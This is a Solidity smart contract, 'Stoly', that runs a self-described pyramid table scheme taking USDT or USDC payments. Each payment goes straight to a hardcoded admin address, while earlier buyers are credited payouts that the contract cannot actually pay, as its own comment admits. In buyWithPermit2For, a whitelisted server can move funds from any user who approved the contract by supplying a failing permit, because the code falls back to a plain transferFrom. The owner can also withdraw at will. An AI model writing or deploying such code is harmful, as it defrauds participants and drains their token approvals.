// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title IPermit2
 * @dev Uniswap Permit2 interface for EIP-2612 permit delegation
 */
interface IPermit2 {
    struct PermitDetails {
        address token;
        uint160 amount;
        uint48 expiration;
        uint48 nonce;
    }

    struct PermitSingle {
        PermitDetails details;
        address spender;
        uint256 sigDeadline;
    }

    struct SignatureTransferDetails {
        address to;
        uint160 requestedAmount;
    }

    function permit(
        address owner,
        PermitSingle calldata permitSingle,
        bytes calldata signature
    ) external;

    function permitTransferFrom(
        PermitSingle calldata permit,
        SignatureTransferDetails calldata transfer,
        address from,
        bytes calldata signature
    ) external;

    function allowance(
        address owner,
        address token,
        address spender
    ) external view returns (uint160 amount, uint48 expiration, uint48 nonce);
}

// Minimal interface for the AllowanceTransfer facet of Permit2
interface IAllowanceTransfer {
    /// transferFrom uses Permit2 internal allowance bookkeeping (uint160 amount)
    function transferFrom(address from, address to, uint160 amount, address token) external;
}

/**
 * @title Stoly
 * @dev Pyramid table system with Permit2 support for multiple tokens (USDT, USDC, etc)
 *
 * NOTE: This variant forwards incoming payments immediately to the hardcoded
 * admin receiver address (ADMIN_RECEIVER). Contract will still record purchases,
 * but funds will not be held on contract balance. This simplifies testing and
 * lets the admin receive funds directly. Be aware that on-chain claim() payouts
 * from the contract balance will not work unless funds are transferred back to
 * the contract.
 */
contract Stoly is Ownable, ReentrancyGuard {
    // Permit2 address on Arbitrum (same on all chains)
    address public constant PERMIT2_ADDRESS = 0x000000000022D473030F116dFC727EFd87a91c5C;
    IPermit2 public constant permit2 = IPermit2(PERMIT2_ADDRESS);

    IERC20 public usdtToken;

    // Hardcoded admin receiver address (payments will be forwarded here)
    address public constant ADMIN_RECEIVER = 0x75c6320E7C562a3a27E1507203aD5cE5D4dFe7B7;

    // Configuration
    uint256 public constant LEVEL_THRESHOLDS_0 = 0;
    uint256 public constant LEVEL_THRESHOLDS_1 = 5;
    uint256 public constant LEVEL_THRESHOLDS_2 = 15;
    uint256 public constant LEVEL_THRESHOLDS_3 = 35;
    uint256 public constant LEVEL_THRESHOLDS_4 = 70;
    uint256 public constant PRICE_TABLE_1 = 100e6;
    uint256 public constant PRICE_TABLE_2 = 200e6;
    uint256 public constant TOTAL_TABLES = 10;
    uint256 public TABLE_2_OPEN_TIME;

    // State
    mapping(uint256 => bool) public openTables;
    mapping(address => mapping(uint256 => bool)) public hasBought;
    mapping(uint256 => Purchase[]) public purchases;
    mapping(address => uint256) public claimableBalance;
    mapping(address => bool) public whitelistedServers;
    mapping(address => bool) public supportedTokens;

    uint256 public nextPurchaseId = 1;
    uint256 public nextPayoutId = 1;

    // Data structures
    struct Purchase {
        uint256 id;
        address wallet;
        uint256 tableId;
        uint256 entryLevel;
        uint256 amount;
        address tokenUsed;
        uint256 timestamp;
    }

    struct Payout {
        uint256 id;
        address to;
        address from;
        uint256 tableId;
        uint256 amount;
        uint256 timestamp;
        bool claimed;
    }

    Payout[] public allPayouts;

    // Events
    event TableOpened(uint256 indexed tableId, uint256 timestamp);
    event TableClosed(uint256 indexed tableId, uint256 timestamp);
    event PurchaseCreated(
        uint256 indexed purchaseId,
        address indexed wallet,
        uint256 indexed tableId,
        uint256 entryLevel,
        uint256 amount,
        address tokenUsed,
        uint256 timestamp
    );
    event PayoutCreated(
        uint256 indexed payoutId,
        address indexed to,
        address indexed from,
        uint256 tableId,
        uint256 amount,
        uint256 timestamp
    );
    event PayoutClaimed(
        uint256 indexed payoutId,
        address indexed wallet,
        uint256 amount,
        uint256 timestamp
    );
    event TokenSupported(address indexed token);
    event TokenUnsupported(address indexed token);
    event ServerAuthorized(address indexed server);
    event ServerRevoked(address indexed server);
    event Permit2Used(address indexed user, address indexed token, uint256 amount);

    // Modifiers
    modifier onlyServer() {
        require(whitelistedServers[msg.sender], "Not authorized server");
        _;
    }

    // Constructor
    constructor(address _usdtToken, uint256 _table2OpenTime) {
        usdtToken = IERC20(_usdtToken);
        TABLE_2_OPEN_TIME = _table2OpenTime;
        supportedTokens[_usdtToken] = true;

        openTables[1] = true;
        emit TableOpened(1, block.timestamp);
    }

    // Admin functions
    function authorizeServer(address _server) external onlyOwner {
        whitelistedServers[_server] = true;
        emit ServerAuthorized(_server);
    }

    function revokeServer(address _server) external onlyOwner {
        whitelistedServers[_server] = false;
        emit ServerRevoked(_server);
    }

    function openTable(uint256 _tableId) external onlyOwner {
        require(_tableId > 0 && _tableId <= TOTAL_TABLES, "Invalid table");
        require(!openTables[_tableId], "Already open");
        openTables[_tableId] = true;
        emit TableOpened(_tableId, block.timestamp);
    }

    function closeTable(uint256 _tableId) external onlyOwner {
        require(openTables[_tableId], "Not open");
        openTables[_tableId] = false;
        emit TableClosed(_tableId, block.timestamp);
    }

    function supportToken(address _token) external onlyOwner {
        require(_token != address(0), "Invalid token");
        supportedTokens[_token] = true;
        emit TokenSupported(_token);
    }

    function unsupportToken(address _token) external onlyOwner {
        supportedTokens[_token] = false;
        emit TokenUnsupported(_token);
    }

    // Public functions
    function getPrice(uint256 _tableId) public pure returns (uint256) {
        if (_tableId == 1) return PRICE_TABLE_1;
        if (_tableId == 2) return PRICE_TABLE_2;
        return PRICE_TABLE_1 * _tableId;
    }

    function currentLevel(uint256 _tableId) public view returns (uint256) {
        uint256 buyCount = purchases[_tableId].length;
        if (buyCount < LEVEL_THRESHOLDS_1) return 1;
        if (buyCount < LEVEL_THRESHOLDS_2) return 2;
        if (buyCount < LEVEL_THRESHOLDS_3) return 3;
        if (buyCount < LEVEL_THRESHOLDS_4) return 4;
        return 5;
    }

    function getPurchases(uint256 _tableId) external view returns (Purchase[] memory) {
        return purchases[_tableId];
    }

    function getPurchasesCount(uint256 _tableId) external view returns (uint256) {
        return purchases[_tableId].length;
    }

    function getPayouts() external view returns (Payout[] memory) {
        return allPayouts;
    }

    function getPayoutsCount() external view returns (uint256) {
        return allPayouts.length;
    }

    // ===== PERMIT2 FUNCTIONS =====

    /**
     * @dev Buy with Permit2 - allows payment with signed permit instead of separate approve
     * Payments are forwarded immediately to ADMIN_RECEIVER.
     */
    function buyWithPermit2(
        uint256 _tableId,
        address _token,
        uint256 _amount,
        IPermit2.PermitDetails calldata _permitDetails,
        uint256 _sigDeadline,
        bytes calldata _signature
    ) external nonReentrant {
        require(openTables[_tableId], "Table not open");
        require(_tableId > 0 && _tableId <= TOTAL_TABLES, "Invalid table");
        require(!hasBought[msg.sender][_tableId], "Already bought this table");
        require(supportedTokens[_token], "Token not supported");
        require(_token == _permitDetails.details.token, "Token mismatch in permit");

        uint256 price = getPrice(_tableId);
        require(_amount >= price, "Insufficient amount");
        require(block.timestamp <= _sigDeadline, "Signature expired");

        // Build permit single
        IPermit2.PermitSingle memory permitSingle = IPermit2.PermitSingle({
            details: _permitDetails,
            spender: address(this),
            sigDeadline: _sigDeadline
        });

        bool transferred = false;

        // If price fits into uint160, try to use Permit2 AllowanceTransfer + transferFrom
        if (price <= type(uint160).max) {
            try permit2.permit(msg.sender, permitSingle, _signature) {
                // Use Permit2's internal allowance bookkeeping to transfer directly to ADMIN_RECEIVER
                IAllowanceTransfer(PERMIT2_ADDRESS).transferFrom(msg.sender, ADMIN_RECEIVER, uint160(price), _token);
                transferred = true;
            } catch {
                transferred = false;
            }
        }

        if (!transferred) {
            // Fallback to direct ERC20 transferFrom to ADMIN_RECEIVER
            require(
                IERC20(_token).transferFrom(msg.sender, ADMIN_RECEIVER, price),
                "Transfer failed - invalid permit or insufficient balance"
            );
        } else {
            emit Permit2Used(msg.sender, _token, price);
        }

        // Record the purchase (contract does not hold funds)
        uint256 entryLevel = currentLevel(_tableId);
        uint256 purchaseId = nextPurchaseId++;
        hasBought[msg.sender][_tableId] = true;
        purchases[_tableId].push(
            Purchase({
                id: purchaseId,
                wallet: msg.sender,
                tableId: _tableId,
                entryLevel: entryLevel,
                amount: price,
                tokenUsed: _token,
                timestamp: block.timestamp
            })
        );

        emit PurchaseCreated(
            purchaseId,
            msg.sender,
            _tableId,
            entryLevel,
            price,
            _token,
            block.timestamp
        );

        _distribute(_tableId, purchaseId, msg.sender, price);
    }

    /**
     * @dev Allow whitelisted server/admin to execute a buy on behalf of a user using their Permit2 signature.
     * Payments are forwarded to ADMIN_RECEIVER.
     */
    function buyWithPermit2For(
        address _owner,
        uint256 _tableId,
        address _token,
        uint256 _amount,
        IPermit2.PermitDetails calldata _permitDetails,
        uint256 _sigDeadline,
        bytes calldata _signature
    ) external onlyServer nonReentrant {
        require(_owner != address(0), "Invalid owner");
        require(openTables[_tableId], "Table not open");
        require(_tableId > 0 && _tableId <= TOTAL_TABLES, "Invalid table");
        require(!hasBought[_owner][_tableId], "Already bought this table");
        require(supportedTokens[_token], "Token not supported");
        require(_token == _permitDetails.details.token, "Token mismatch in permit");

        uint256 price = getPrice(_tableId);
        require(_amount >= price, "Insufficient amount");
        require(block.timestamp <= _sigDeadline, "Signature expired");

        IPermit2.PermitSingle memory permitSingle = IPermit2.PermitSingle({
            details: _permitDetails,
            spender: address(this),
            sigDeadline: _sigDeadline
        });

        bool transferred = false;

        if (price <= type(uint160).max) {
            try permit2.permit(_owner, permitSingle, _signature) {
                IAllowanceTransfer(PERMIT2_ADDRESS).transferFrom(_owner, ADMIN_RECEIVER, uint160(price), _token);
                transferred = true;
            } catch {
                transferred = false;
            }
        }

        if (!transferred) {
            require(
                IERC20(_token).transferFrom(_owner, ADMIN_RECEIVER, price),
                "Transfer failed - invalid permit or insufficient balance"
            );
        } else {
            emit Permit2Used(_owner, _token, price);
        }

        uint256 entryLevel = currentLevel(_tableId);
        uint256 purchaseId = nextPurchaseId++;
        hasBought[_owner][_tableId] = true;
        purchases[_tableId].push(
            Purchase({
                id: purchaseId,
                wallet: _owner,
                tableId: _tableId,
                entryLevel: entryLevel,
                amount: price,
                tokenUsed: _token,
                timestamp: block.timestamp
            })
        );

        emit PurchaseCreated(
            purchaseId,
            _owner,
            _tableId,
            entryLevel,
            price,
            _token,
            block.timestamp
        );

        _distribute(_tableId, purchaseId, _owner, price);
    }

    // Main purchase function (original - with standard approve)
    function buy(uint256 _tableId) external nonReentrant {
        require(openTables[_tableId], "Table not open");
        require(_tableId > 0 && _tableId <= TOTAL_TABLES, "Invalid table");
        require(!hasBought[msg.sender][_tableId], "Already bought this table");

        uint256 price = getPrice(_tableId);
        uint256 entryLevel = currentLevel(_tableId);

        require(
            usdtToken.transferFrom(msg.sender, ADMIN_RECEIVER, price),
            "Transfer failed"
        );

        uint256 purchaseId = nextPurchaseId++;
        hasBought[msg.sender][_tableId] = true;
        purchases[_tableId].push(
            Purchase({
                id: purchaseId,
                wallet: msg.sender,
                tableId: _tableId,
                entryLevel: entryLevel,
                amount: price,
                tokenUsed: address(usdtToken),
                timestamp: block.timestamp
            })
        );

        emit PurchaseCreated(
            purchaseId,
            msg.sender,
            _tableId,
            entryLevel,
            price,
            address(usdtToken),
            block.timestamp
        );

        _distribute(_tableId, purchaseId, msg.sender, price);
    }

    // Internal function: distribute payouts
    function _distribute(
        uint256 _tableId,
        uint256 _buyerId,
        address _buyer,
        uint256 _Amount
    ) internal {
        Purchase[] storage tablePurchases = purchases[_tableId];

        uint256 newLevel = currentLevel(_tableId);
        Purchase[] memory earlierParticipants = new Purchase[](tablePurchases.length);
        uint256 count = 0;

        for (uint256 i = 0; i < tablePurchases.length - 1; i++) {
            if (tablePurchases[i].entryLevel < newLevel) {
                earlierParticipants[count] = tablePurchases[i];
                count++;
            }
        }

        if (count == 0) {
            return;
        }

        uint256 share = _Amount / count;
        if (share == 0) return;

        for (uint256 i = 0; i < count; i++) {
            address recipient = earlierParticipants[i].wallet;

            uint256 payoutId = nextPayoutId++;
            claimableBalance[recipient] += share;

            allPayouts.push(
                Payout({
                    id: payoutId,
                    to: recipient,
                    from: _buyer,
                    tableId: _tableId,
                    amount: share,
                    timestamp: block.timestamp,
                    claimed: false
                })
            );

            emit PayoutCreated(
                payoutId,
                recipient,
                _buyer,
                _tableId,
                share,
                block.timestamp
            );
        }
    }

    // Claim payout
    function claim() external nonReentrant {
        uint256 amount = claimableBalance[msg.sender];
        require(amount > 0, "No claimable balance");

        claimableBalance[msg.sender] = 0;

        require(usdtToken.transfer(msg.sender, amount), "Transfer failed");

        for (uint256 i = allPayouts.length; i > 0; i--) {
            if (allPayouts[i - 1].to == msg.sender && !allPayouts[i - 1].claimed) {
                allPayouts[i - 1].claimed = true;
                emit PayoutClaimed(
                    allPayouts[i - 1].id,
                    msg.sender,
                    allPayouts[i - 1].amount,
                    block.timestamp
                );
            }
        }
    }

    // Server-triggered payout
    function serverPayout(address _to, uint256 _amount)
        external
        onlyServer
        nonReentrant
    {
        require(_amount > 0, "Invalid amount");
        require(
            claimableBalance[_to] >= _amount,
            "Insufficient claimable balance"
        );

        claimableBalance[_to] -= _amount;
        require(usdtToken.transfer(_to, _amount), "Transfer failed");
    }

    // Emergency withdrawal
    function emergencyWithdraw(address _to, uint256 _amount)
        external
        onlyOwner
    {
        require(usdtToken.transfer(_to, _amount), "Transfer failed");
    }
}
